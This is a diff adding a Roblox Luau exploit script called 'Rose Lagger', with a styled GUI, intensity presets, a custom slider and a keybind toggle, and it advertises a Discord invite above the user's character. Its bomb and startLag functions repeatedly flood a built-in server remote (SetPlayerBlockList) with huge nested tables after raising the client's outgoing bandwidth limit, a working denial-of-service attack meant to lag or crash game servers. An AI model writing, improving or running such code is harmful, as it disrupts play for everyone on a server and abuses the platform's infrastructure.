@@ -1,0 +1,828 @@
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+local old = PlayerGui:FindFirstChild("RoseLaggerGui")
+if old then
+	old:Destroy()
+end
+
+local POWER_LEVELS = {
+	V2 = { poder = 30 },
+	LOW = { poder = 25 },
+	MEDIUM = { poder = 32 },
+	HIGH = { poder = 70 },
+	ULTRA = { poder = 120 },
+	CUSTOM = { poder = nil },
+}
+
+local State = {
+	Enabled = false,
+	SelectedPreset = "V2",
+	Keybind = Enum.KeyCode.T,
+	KeybindInputType = "Keyboard",
+	Minimized = false,
+	WaitingForKey = false,
+	CustomValue = 100,
+	lagThread = nil,
+}
+
+local C = {
+	WinBg = Color3.fromRGB(19, 13, 18),
+	WinBorder = Color3.fromRGB(63, 46, 58),
+	TopBarBg = Color3.fromRGB(19, 13, 18),
+	TopBarLine = Color3.fromRGB(51, 36, 46),
+	PanelBg = Color3.fromRGB(24, 17, 22),
+	PanelBorder = Color3.fromRGB(59, 43, 53),
+	Pink = Color3.fromRGB(252, 116, 210),
+	PinkDark = Color3.fromRGB(210, 88, 172),
+	SubText = Color3.fromRGB(195, 144, 180),
+	White = Color3.fromRGB(252, 243, 250),
+	Gray = Color3.fromRGB(105, 86, 98),
+	GrayText = Color3.fromRGB(165, 142, 157),
+	ToggleOff = Color3.fromRGB(43, 30, 39),
+	ToggleOn = Color3.fromRGB(50, 35, 45),
+	ToggleKnob = Color3.fromRGB(248, 244, 247),
+	DarkButton = Color3.fromRGB(40, 29, 36),
+	DarkButtonHover = Color3.fromRGB(51, 37, 46),
+	DarkBorder = Color3.fromRGB(64, 47, 57),
+	V2 = Color3.fromRGB(245, 70, 180),
+	LOW = Color3.fromRGB(235, 82, 205),
+	MEDIUM = Color3.fromRGB(238, 30, 160),
+	HIGH = Color3.fromRGB(225, 55, 110),
+	ULTRA = Color3.fromRGB(250, 0, 120),
+	CUSTOM = Color3.fromRGB(245, 0, 180),
+	SliderBg = Color3.fromRGB(46, 35, 42),
+	KeyBg = Color3.fromRGB(27, 19, 24),
+	KeyBorder = Color3.fromRGB(190, 69, 155),
+	KeyText = Color3.fromRGB(243, 224, 238),
+}
+
+local ENABLE_COLOR = Color3.fromRGB(238, 30, 160)
+
+local function Create(class, props)
+	local obj = Instance.new(class)
+	for key, value in pairs(props) do
+		if key ~= "Parent" then
+			obj[key] = value
+		end
+	end
+	if props.Parent then
+		obj.Parent = props.Parent
+	end
+	return obj
+end
+
+local function Corner(parent, radius)
+	local c = Instance.new("UICorner")
+	c.CornerRadius = UDim.new(0, radius or 8)
+	c.Parent = parent
+	return c
+end
+
+local function Stroke(parent, color, thickness)
+	local s = Instance.new("UIStroke")
+	s.Color = color
+	s.Thickness = thickness or 1
+	s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+	s.Parent = parent
+	return s
+end
+
+local function Tween(obj, properties, duration)
+	TweenService
+		:Create(obj, TweenInfo.new(duration or 0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), properties)
+		:Play()
+end
+
+local function bomb(poder)
+	local main, spam = {}, { {} }
+	local z = spam[1]
+	for i = 1, 25 do
+		local t = {}
+		table.insert(z, t)
+		z = t
+	end
+	local max = math.min(20000, poder * 80)
+	for i = 1, max do
+		table.insert(main, spam)
+	end
+	pcall(function()
+		game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main)
+	end)
+end
+
+local function startLag()
+	if State.lagThread then
+		task.cancel(State.lagThread)
+	end
+	State.lagThread = task.spawn(function()
+		while State.Enabled do
+			local preset = State.SelectedPreset
+			local poder
+			if preset == "CUSTOM" then
+				poder = math.floor(State.CustomValue * 2)
+			else
+				poder = POWER_LEVELS[preset] and POWER_LEVELS[preset].poder or 25
+			end
+			pcall(function()
+				game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000)
+			end)
+			bomb(poder)
+			if preset == "ULTRA" then
+				task.wait(0.08)
+			else
+				task.wait(0.18)
+			end
+		end
+	end)
+end
+
+local function stopLag()
+	if State.lagThread then
+		task.cancel(State.lagThread)
+		State.lagThread = nil
+	end
+end
+
+-- Karakter üstüne büyük Discord BillboardGui ekleme kısmı
+local function setupBillboard(character)
+	if not character then return end
+	local head = character:WaitForChild("Head", 5)
+	if not head then return end
+	
+	if head:FindFirstChild("RoseDiscordBillboard") then
+		head.RoseDiscordBillboard:Destroy()
+	end
+	
+	local bb = Instance.new("BillboardGui")
+	bb.Name = "RoseDiscordBillboard"
+	bb.Size = UDim2.new(0, 300, 0, 60)
+	bb.StudsOffset = Vector3.new(0, 3.5, 0)
+	bb.AlwaysOnTop = true
+	bb.Adornee = head
+	bb.Parent = head
+	
+	local label = Instance.new("TextLabel")
+	label.Size = UDim2.new(1, 0, 1, 0)
+	label.BackgroundTransparency = 1
+	label.Text = "discord.gg/nCqcuz35j"
+	label.TextColor3 = Color3.fromRGB(252, 116, 210)
+	label.TextScaled = true
+	label.Font = Enum.Font.GothamBold
+	label.Parent = bb
+	
+	local stroke = Instance.new("UIStroke")
+	stroke.Color = Color3.fromRGB(0, 0, 0)
+	stroke.Thickness = 2
+	stroke.Parent = label
+end
+
+if LocalPlayer.Character then
+	setupBillboard(LocalPlayer.Character)
+end
+LocalPlayer.CharacterAdded:Connect(setupBillboard)
+
+local WIN_W = 400
+local WIN_H = 250
+local TOPBAR_H = 48
+local PAD = 10
+
+local ScreenGui = Create("ScreenGui", {
+	Name = "RoseLaggerGui",
+	ResetOnSpawn = false,
+	ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
+	DisplayOrder = 999,
+	Parent = PlayerGui,
+})
+
+local MainWindow = Create("Frame", {
+	Name = "MainWindow",
+	Size = UDim2.new(0, WIN_W, 0, WIN_H),
+	Position = UDim2.new(0.5, -WIN_W / 2, 0.5, -WIN_H / 2),
+	BackgroundColor3 = C.WinBg,
+	BorderSizePixel = 0,
+	Parent = ScreenGui,
+})
+
+Corner(MainWindow, 10)
+Stroke(MainWindow, C.WinBorder, 1.4)
+
+local TopBar = Create("Frame", {
+	Name = "TopBar",
+	Size = UDim2.new(1, 0, 0, TOPBAR_H),
+	BackgroundColor3 = C.TopBarBg,
+	BorderSizePixel = 0,
+	ZIndex = 3,
+	Parent = MainWindow,
+})
+
+Corner(TopBar, 10)
+
+local TopBarFill = Create("Frame", {
+	Size = UDim2.new(1, 0, 0, 12),
+	Position = UDim2.new(0, 0, 1, -12),
+	BackgroundColor3 = C.TopBarBg,
+	BorderSizePixel = 0,
+	ZIndex = 3,
+	Parent = TopBar,
+})
+
+local TopSep = Create("Frame", {
+	Size = UDim2.new(1, 0, 0, 1),
+	Position = UDim2.new(0, 0, 1, 0),
+	BackgroundColor3 = C.TopBarLine,
+	BorderSizePixel = 0,
+	ZIndex = 4,
+	Parent = TopBar,
+})
+
+local TitleLabel = Create("TextLabel", {
+	Name = "Title",
+	Size = UDim2.new(0, 150, 1, 0),
+	Position = UDim2.new(0, 15, 0, 0),
+	BackgroundTransparency = 1,
+	Text = "ROSE LAGGER",
+	TextColor3 = C.Pink,
+	Font = Enum.Font.GothamBold,
+	TextSize = 16,
+	TextXAlignment = Enum.TextXAlignment.Left,
+	ZIndex = 5,
+	Parent = TopBar,
+})
+
+local DotSep = Create("TextLabel", {
+	Name = "Dot",
+	Size = UDim2.new(0, 15, 1, 0),
+	Position = UDim2.new(0, 158, 0, 0),
+	BackgroundTransparency = 1,
+	Text = "•",
+	TextColor3 = C.PinkDark,
+	Font = Enum.Font.GothamBold,
+	TextSize = 14,
+	TextXAlignment = Enum.TextXAlignment.Center,
+	ZIndex = 5,
+	Parent = TopBar,
+})
+
+local SubLabel = Create("TextLabel", {
+	Name = "SubTitle",
+	Size = UDim2.new(0, 200, 1, 0),
+	Position = UDim2.new(0, 174, 0, 0),
+	BackgroundTransparency = 1,
+	Text = "discord.gg/nCqcuz35j",
+	TextColor3 = C.Pink,
+	Font = Enum.Font.GothamBold,
+	TextSize = 12,
+	TextXAlignment = Enum.TextXAlignment.Left,
+	ZIndex = 5,
+	Parent = TopBar,
+})
+
+local function MakeWinBtn(symbol, rightOffset)
+	local btn = Create("TextButton", {
+		Size = UDim2.new(0, 29, 0, 29),
+		Position = UDim2.new(1, rightOffset, 0.5, -14),
+		BackgroundColor3 = Color3.fromRGB(38, 27, 35),
+		Text = symbol,
+		TextColor3 = Color3.fromRGB(215, 190, 208),
+		Font = Enum.Font.GothamBold,
+		TextSize = 15,
+		AutoButtonColor = false,
+		ZIndex = 6,
+		Parent = TopBar,
+	})
+	Corner(btn, 7)
+	Stroke(btn, Color3.fromRGB(69, 50, 63), 1)
+	return btn
+end
+
+local MinimizeBtn = MakeWinBtn("−", -70)
+local CloseBtn = MakeWinBtn("×", -34)
+
+local ContentFrame = Create("Frame", {
+	Name = "Content",
+	Size = UDim2.new(1, -PAD * 2, 0, WIN_H - TOPBAR_H - PAD - 8),
+	Position = UDim2.new(0, PAD, 0, TOPBAR_H + PAD),
+	BackgroundColor3 = C.PanelBg,
+	BorderSizePixel = 0,
+	ClipsDescendants = true,
+	ZIndex = 2,
+	Parent = MainWindow,
+})
+
+Corner(ContentFrame, 9)
+Stroke(ContentFrame, C.PanelBorder, 1)
+
+-- Arka plana 72721615229723 ID'li resmi ekleme kısmı
+local BgImage = Create("ImageLabel", {
+	Name = "BackgroundImage",
+	Size = UDim2.new(1, 0, 1, 0),
+	Position = UDim2.new(0, 0, 0, 0),
+	BackgroundTransparency = 1,
+	Image = "rbxassetid://72721615229723",
+	ImageTransparency = 0.75,
+	ScaleType = Enum.ScaleType.Slice,
+	ZIndex = 2,
+	Parent = ContentFrame,
+})
+
+local contentNormalSize = ContentFrame.Size
+
+local ActiveOverlay = Create("Frame", {
+	Name = "EnableColor",
+	Size = UDim2.new(1, 0, 1, 0),
+	Position = UDim2.new(0, 0, 0, 0),
+	BackgroundColor3 = ENABLE_COLOR,
+	BackgroundTransparency = 1,
+	BorderSizePixel = 0,
+	ZIndex = 3,
+	Parent = ContentFrame,
+})
+
+Corner(ActiveOverlay, 9)
+
+local AccentLine = Create("Frame", {
+	Name = "AccentLine",
+	Size = UDim2.new(0, 3, 1, -20),
+	Position = UDim2.new(0, 2, 0, 10),
+	BackgroundColor3 = ENABLE_COLOR,
+	BorderSizePixel = 0,
+	ZIndex = 7,
+	Parent = ContentFrame,
+})
+
+Corner(AccentLine, 3)
+
+local Header = Create("Frame", {
+	Name = "Header",
+	Size = UDim2.new(1, -42, 0, 55),
+	Position = UDim2.new(0, 20, 0, 10),
+	BackgroundTransparency = 1,
+	ZIndex = 8,
+	Parent = ContentFrame,
+})
+
+local HDot = Create("TextLabel", {
+	Size = UDim2.new(0, 16, 0, 25),
+	Position = UDim2.new(0, 0, 0, 0),
+	BackgroundTransparency = 1,
+	Text = "●",
+	TextColor3 = C.Gray,
+	Font = Enum.Font.Gotham,
+	TextSize = 9,
+	TextXAlignment = Enum.TextXAlignment.Left,
+	ZIndex = 9,
+	Parent = Header,
+})
+
+local LaggerLabel = Create("TextLabel", {
+	Name = "LaggerTitle",
+	Size = UDim2.new(0, 150, 0, 27),
+	Position = UDim2.new(0, 17, 0, 0),
+	BackgroundTransparency = 1,
+	Text = "Rose Lagger",
+	TextColor3 = C.White,
+	Font = Enum.Font.GothamBold,
+	TextSize = 17,
+	TextXAlignment = Enum.TextXAlignment.Left,
+	ZIndex = 9,
+	Parent = Header,
+})
+
+local StatusLabel = Create("TextLabel", {
+	Name = "Status",
+	Size = UDim2.new(0, 100, 0, 18),
+	Position = UDim2.new(0, 0, 0, 27),
+	BackgroundTransparency = 1,
+	Text = "DISABLED",
+	TextColor3 = C.Gray,
+	Font = Enum.Font.GothamSemibold,
+	TextSize = 10,
+	TextXAlignment = Enum.TextXAlignment.Left,
+	ZIndex = 9,
+	Parent = Header,
+})
+
+local ToggleTrack = Create("TextButton", {
+	Name = "Toggle",
+	Size = UDim2.new(0, 48, 0, 25),
+	Position = UDim2.new(1, -48, 0, 3),
+	BackgroundColor3 = C.ToggleOff,
+	Text = "",
+	AutoButtonColor = false,
+	ZIndex = 10,
+	Parent = Header,
+})
+
+Corner(ToggleTrack, 20)
+
+local ToggleKnob = Create("Frame", {
+	Name = "Knob",
+	Size = UDim2.new(0, 19, 0, 19),
+	Position = UDim2.new(0, 3, 0.5, -9),
+	BackgroundColor3 = C.ToggleKnob,
+	BorderSizePixel = 0,
+	ZIndex = 11,
+	Parent = ToggleTrack,
+})
+
+Corner(ToggleKnob, 10)
+
+local PresetsFrame = Create("Frame", {
+	Name = "Presets",
+	Size = UDim2.new(1, -38, 0, 38),
+	Position = UDim2.new(0, 20, 0, 72),
+	BackgroundTransparency = 1,
+	ZIndex = 8,
+	Parent = ContentFrame,
+})
+
+local Layout = Create("UIListLayout", {
+	FillDirection = Enum.FillDirection.Horizontal,
+	HorizontalAlignment = Enum.HorizontalAlignment.Left,
+	VerticalAlignment = Enum.VerticalAlignment.Center,
+	Padding = UDim.new(0, 5),
+	Parent = PresetsFrame,
+})
+
+local PresetConfigs = {
+	{ Label = "V2", Color = C.V2, Width = 43 },
+	{ Label = "LOW", Color = C.LOW, Width = 52 },
+	{ Label = "MEDIUM", Color = C.MEDIUM, Width = 70 },
+	{ Label = "HIGH", Color = C.HIGH, Width = 55 },
+	{ Label = "ULTRA", Color = C.ULTRA, Width = 58 },
+	{ Label = "CUSTOM", Color = C.CUSTOM, Width = 66 },
+}
+
+local PresetButtons = {}
+local SliderFrame
+
+for _, cfg in ipairs(PresetConfigs) do
+	local button = Create("TextButton", {
+		Name = "Preset_" .. cfg.Label,
+		Size = UDim2.new(0, cfg.Width, 0, 30),
+		BackgroundColor3 = C.DarkButton,
+		Text = cfg.Label,
+		TextColor3 = C.GrayText,
+		Font = Enum.Font.GothamBold,
+		TextSize = 10,
+		AutoButtonColor = false,
+		ZIndex = 9,
+		Parent = PresetsFrame,
+	})
+	Corner(button, 16)
+	local stroke = Stroke(button, C.DarkBorder, 1)
+	table.insert(PresetButtons, {
+		Config = cfg,
+		Button = button,
+		Stroke = stroke,
+	})
+end
+
+SliderFrame = Create("Frame", {
+	Name = "CustomSlider",
+	Size = UDim2.new(1, -40, 0, 48),
+	Position = UDim2.new(0, 20, 0, 118),
+	BackgroundTransparency = 1,
+	BorderSizePixel = 0,
+	ZIndex = 9,
+	Parent = ContentFrame,
+})
+
+SliderFrame.Visible = false
+
+local SliderTrack = Create("Frame", {
+	Name = "Track",
+	Size = UDim2.new(1, -58, 0, 6),
+	Position = UDim2.new(0, 0, 0.5, -3),
+	BackgroundColor3 = Color3.fromRGB(60, 48, 55),
+	BackgroundTransparency = 0,
+	BorderSizePixel = 0,
+	ZIndex = 10,
+	Parent = SliderFrame,
+})
+
+Corner(SliderTrack, 5)
+
+local SliderFill = Create("Frame", {
+	Name = "Fill",
+	Size = UDim2.new(0.5, 0, 1, 0),
+	BackgroundColor3 = C.CUSTOM,
+	BorderSizePixel = 0,
+	ZIndex = 11,
+	Parent = SliderTrack,
+})
+
+Corner(SliderFill, 5)
+
+local SliderKnob = Create("Frame", {
+	Name = "Knob",
+	Size = UDim2.new(0, 19, 0, 19),
+	Position = UDim2.new(0.5, -9, 0.5, -9),
+	BackgroundColor3 = Color3.fromRGB(248, 245, 247),
+	BorderSizePixel = 0,
+	ZIndex = 12,
+	Parent = SliderTrack,
+})
+
+Corner(SliderKnob, 10)
+Stroke(SliderKnob, C.CUSTOM, 1.5)
+
+local SliderValue = Create("TextLabel", {
+	Name = "Value",
+	Size = UDim2.new(0, 48, 0, 25),
+	Position = UDim2.new(1, -48, 0.5, -12),
+	BackgroundTransparency = 1,
+	Text = "100%",
+	TextColor3 = C.CUSTOM,
+	Font = Enum.Font.GothamBold,
+	TextSize = 11,
+	TextXAlignment = Enum.TextXAlignment.Right,
+	ZIndex = 11,
+	Parent = SliderFrame,
+})
+
+local sliderDragging = false
+
+local function SetSliderFromX(x)
+	local absolutePosition = SliderTrack.AbsolutePosition.X
+	local absoluteSize = SliderTrack.AbsoluteSize.X
+	local percent = math.clamp((x - absolutePosition) / absoluteSize, 0, 1)
+	local value = math.floor(percent * 200 + 0.5)
+	State.CustomValue = value
+	SliderFill.Size = UDim2.new(percent, 0, 1, 0)
+	SliderKnob.Position = UDim2.new(percent, -9, 0.5, -9)
+	SliderValue.Text = tostring(value) .. "%"
+end
+
+SliderTrack.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		sliderDragging = true
+		SetSliderFromX(input.Position.X)
+	end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+	if sliderDragging then
+		if
+			input.UserInputType == Enum.UserInputType.MouseMovement
+			or input.UserInputType == Enum.UserInputType.Touch
+		then
+			SetSliderFromX(input.Position.X)
+		end
+	end
+end)
+
+UserInputService.InputEnded:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		sliderDragging = false
+	end
+end)
+
+local function refreshPresetButtons()
+	for _, data in ipairs(PresetButtons) do
+		if data.Config.Label == State.SelectedPreset then
+			Tween(data.Button, { BackgroundColor3 = Color3.fromRGB(44, 32, 40) }, 0.12)
+			data.Button.TextColor3 = data.Config.Color
+			data.Stroke.Color = data.Config.Color
+			data.Stroke.Thickness = 1.7
+		else
+			Tween(data.Button, { BackgroundColor3 = C.DarkButton }, 0.12)
+			data.Button.TextColor3 = C.GrayText
+			data.Stroke.Color = C.DarkBorder
+			data.Stroke.Thickness = 1
+		end
+	end
+end
+
+for _, data in ipairs(PresetButtons) do
+	local cfg = data.Config
+	local button = data.Button
+	button.MouseButton1Click:Connect(function()
+		State.SelectedPreset = cfg.Label
+		refreshPresetButtons()
+		if cfg.Label == "CUSTOM" then
+			SliderFrame.Visible = true
+		else
+			SliderFrame.Visible = false
+		end
+	end)
+	button.MouseEnter:Connect(function()
+		if State.SelectedPreset ~= cfg.Label then
+			Tween(button, { BackgroundColor3 = C.DarkButtonHover }, 0.1)
+		end
+	end)
+	button.MouseLeave:Connect(function()
+		if State.SelectedPreset ~= cfg.Label then
+			Tween(button, { BackgroundColor3 = C.DarkButton }, 0.1)
+		end
+	end)
+end
+
+local KeyButton = Create("TextButton", {
+	Name = "KeyButton",
+	Size = UDim2.new(0, 78, 0, 29),
+	Position = UDim2.new(0, 20, 1, -39),
+	BackgroundColor3 = C.KeyBg,
+	Text = "KEY: T",
+	TextColor3 = C.KeyText,
+	Font = Enum.Font.GothamBold,
+	TextSize = 10,
+	AutoButtonColor = false,
+	ZIndex = 9,
+	Parent = ContentFrame,
+})
+
+Corner(KeyButton, 16)
+local KeyStroke = Stroke(KeyButton, C.KeyBorder, 1.4)
+
+local function SetEnabled(value)
+	State.Enabled = value
+	if value then
+		StatusLabel.Text = "ENABLED"
+		StatusLabel.TextColor3 = C.Pink
+		Tween(ToggleTrack, { BackgroundColor3 = C.ToggleOn }, 0.18)
+		Tween(ToggleKnob, { Position = UDim2.new(1, -22, 0.5, -9) }, 0.18)
+		Tween(ActiveOverlay, { BackgroundColor3 = ENABLE_COLOR, BackgroundTransparency = 0.91 }, 0.22)
+		startLag()
+	else
+		StatusLabel.Text = "DISABLED"
+		StatusLabel.TextColor3 = C.Gray
+		Tween(ToggleTrack, { BackgroundColor3 = C.ToggleOff }, 0.18)
+		Tween(ToggleKnob, { Position = UDim2.new(0, 3, 0.5, -9) }, 0.18)
+		Tween(ActiveOverlay, { BackgroundTransparency = 1 }, 0.22)
+		stopLag()
+	end
+end
+
+ToggleTrack.MouseButton1Click:Connect(function()
+	SetEnabled(not State.Enabled)
+end)
+
+local GamepadNames = {
+	[Enum.KeyCode.ButtonA] = "A",
+	[Enum.KeyCode.ButtonB] = "B",
+	[Enum.KeyCode.ButtonX] = "X",
+	[Enum.KeyCode.ButtonY] = "Y",
+	[Enum.KeyCode.ButtonL1] = "L1 / LB",
+	[Enum.KeyCode.ButtonL2] = "L2 / LT",
+	[Enum.KeyCode.ButtonL3] = "L3 / LS",
+	[Enum.KeyCode.ButtonR1] = "R1 / RB",
+	[Enum.KeyCode.ButtonR2] = "R2 / RT",
+	[Enum.KeyCode.ButtonR3] = "R3 / RS",
+	[Enum.KeyCode.ButtonSelect] = "SELECT / SHARE",
+	[Enum.KeyCode.ButtonStart] = "START / OPTIONS",
+	[Enum.KeyCode.DPadUp] = "D-UP",
+	[Enum.KeyCode.DPadDown] = "D-DOWN",
+	[Enum.KeyCode.DPadLeft] = "D-LEFT",
+	[Enum.KeyCode.DPadRight] = "D-RIGHT",
+}
+
+local function GetKeyName(keyCode, inputType)
+	if inputType == "Gamepad" then
+		return GamepadNames[keyCode] or tostring(keyCode):gsub("Enum%.KeyCode%.", "")
+	else
+		return tostring(keyCode):gsub("Enum%.KeyCode%.", "")
+	end
+end
+
+local function UpdateKeyLabel()
+	KeyButton.Text = "KEY: " .. GetKeyName(State.Keybind, State.KeybindInputType)
+end
+
+KeyButton.MouseButton1Click:Connect(function()
+	if State.WaitingForKey then
+		return
+	end
+	State.WaitingForKey = true
+	KeyButton.Text = "PRESS KEY..."
+	KeyButton.TextColor3 = C.Pink
+	Tween(KeyStroke, { Color = C.Pink }, 0.1)
+end)
+
+UserInputService.InputBegan:Connect(function(input, gpe)
+	if State.WaitingForKey then
+		local validKeyboard = input.UserInputType == Enum.UserInputType.Keyboard
+			and input.KeyCode ~= Enum.KeyCode.Unknown
+		local validGamepad = (
+			input.UserInputType == Enum.UserInputType.Gamepad1
+			or input.UserInputType == Enum.UserInputType.Gamepad2
+			or input.UserInputType == Enum.UserInputType.Gamepad3
+			or input.UserInputType == Enum.UserInputType.Gamepad4
+		) and input.KeyCode ~= Enum.KeyCode.Unknown
+
+		if validKeyboard then
+			State.Keybind = input.KeyCode
+			State.KeybindInputType = "Keyboard"
+			State.WaitingForKey = false
+			UpdateKeyLabel()
+			KeyButton.TextColor3 = C.KeyText
+			Tween(KeyStroke, { Color = C.KeyBorder }, 0.1)
+		elseif validGamepad then
+			State.Keybind = input.KeyCode
+			State.KeybindInputType = "Gamepad"
+			State.WaitingForKey = false
+			UpdateKeyLabel()
+			KeyButton.TextColor3 = C.KeyText
+			Tween(KeyStroke, { Color = C.KeyBorder }, 0.1)
+		end
+		return
+	end
+
+	local isGamepadInput = (
+		input.UserInputType == Enum.UserInputType.Gamepad1
+		or input.UserInputType == Enum.UserInputType.Gamepad2
+		or input.UserInputType == Enum.UserInputType.Gamepad3
+		or input.UserInputType == Enum.UserInputType.Gamepad4
+	)
+	local isKeyboardInput = input.UserInputType == Enum.UserInputType.Keyboard
+
+	if not gpe and (isKeyboardInput or isGamepadInput) then
+		if input.KeyCode == State.Keybind then
+			SetEnabled(not State.Enabled)
+		end
+	end
+end)
+
+local windowFullSize = UDim2.new(0, WIN_W, 0, WIN_H)
+local windowMinSize = UDim2.new(0, WIN_W, 0, TOPBAR_H)
+
+MinimizeBtn.MouseButton1Click:Connect(function()
+	State.Minimized = not State.Minimized
+	if State.Minimized then
+		MinimizeBtn.Text = "+"
+		Tween(ContentFrame, { Size = UDim2.new(1, -PAD * 2, 0, 0) }, 0.2)
+		Tween(MainWindow, { Size = windowMinSize }, 0.2)
+		task.delay(0.21, function()
+			ContentFrame.Visible = false
+		end)
+	else
+		MinimizeBtn.Text = "−"
+		ContentFrame.Visible = true
+		ContentFrame.Size = UDim2.new(1, -PAD * 2, 0, 0)
+		Tween(ContentFrame, { Size = contentNormalSize }, 0.2)
+		Tween(MainWindow, { Size = windowFullSize }, 0.2)
+	end
+end)
+
+CloseBtn.MouseButton1Click:Connect(function()
+	stopLag()
+	Tween(MainWindow, { BackgroundTransparency = 1 }, 0.15)
+	task.delay(0.16, function()
+		if ScreenGui then
+			ScreenGui:Destroy()
+		end
+	end)
+end)
+
+local dragging = false
+local dragStart
+local startPos
+
+TopBar.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		dragging = true
+		dragStart = input.Position
+		startPos = MainWindow.Position
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+	if dragging then
+		if
+			input.UserInputType == Enum.UserInputType.MouseMovement
+			or input.UserInputType == Enum.UserInputType.Touch
+		then
+			local delta = input.Position - dragStart
+			MainWindow.Position =
+				UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+		end
+	end
+end)
+
+MinimizeBtn.MouseEnter:Connect(function()
+	Tween(MinimizeBtn, { BackgroundColor3 = Color3.fromRGB(63, 46, 58) }, 0.1)
+end)
+MinimizeBtn.MouseLeave:Connect(function()
+	Tween(MinimizeBtn, { BackgroundColor3 = Color3.fromRGB(38, 27, 35) }, 0.1)
+end)
+CloseBtn.MouseEnter:Connect(function()
+	Tween(CloseBtn, { BackgroundColor3 = Color3.fromRGB(125, 35, 90) }, 0.1)
+end)
+CloseBtn.MouseLeave:Connect(function()
+	Tween(CloseBtn, { BackgroundColor3 = Color3.fromRGB(38, 27, 35) }, 0.1)
+end)
+
+UpdateKeyLabel()
+refreshPresetButtons()
+SetEnabled(false)
